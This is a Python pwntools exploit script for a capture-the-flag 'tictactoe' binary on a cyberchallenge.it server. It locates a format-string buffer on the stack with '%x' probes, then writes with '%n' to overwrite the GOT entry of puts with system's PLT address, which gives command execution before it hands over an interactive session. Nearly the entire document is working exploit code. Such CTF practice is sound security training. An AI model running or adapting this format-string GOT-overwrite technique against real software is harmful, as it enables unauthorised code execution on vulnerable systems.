#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./tictactoe")
context.binary = exe


# Everything was found with the disassembler
BUFF_LENGTH = 128
SYS_INPUT_STR = 0x08048e78


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("tictactoe.challs.cyberchallenge.it", 9132)


def get_buff_arg_pos() -> int:
    marker = 'AAAA'

    buff_start_pos = 1
    while True:
        payload = marker + (' %x' * buff_start_pos)
        r.sendlineafter('Your move: ', payload)

        # Match string with regex and convert it to list of strings
        output = re.match(f'I don\'t understand: {marker} (.*), please insert a number between 1 and 9\.', r.recvlineS()).group(1)
        output = output.split(' ')

        if marker.encode('ascii').hex() in output:
            log.info(f'Found buffer argument position!\n#{buff_start_pos} argument in the stack')
            break

        buff_start_pos += 1

    return buff_start_pos


# Overwrites 'func' GOT entry with 'system' PLT entry
def func2system(buff_arg_pos: int, func: str):
    func_got = exe.got[func]          # Since it's used, we already have a GOT entry for this function
    system_plt = exe.plt['system']

    # Write as much characters as the integer value of the GOT address
    payload = f'%{system_plt}c'.ljust(12).encode('ascii')

    # Use "%n" to write the number of printed chars in the specified address
    payload += f'%{buff_arg_pos + (len(payload) // 4) + 2}$n'.ljust(8).encode('ascii')

    # Function address to overwrite (first two bytes will be overwrited)
    payload += p32(func_got)

    print(payload)

    r.sendlineafter('Your move: ', payload)
    r.recvline()


def main():
    conn()

    buff_arg_pos = get_buff_arg_pos()
    func2system(buff_arg_pos, 'puts')
    r.interactive()     # From now on, try to win and let the program call the function 'puts'


if __name__ == "__main__":
    main()
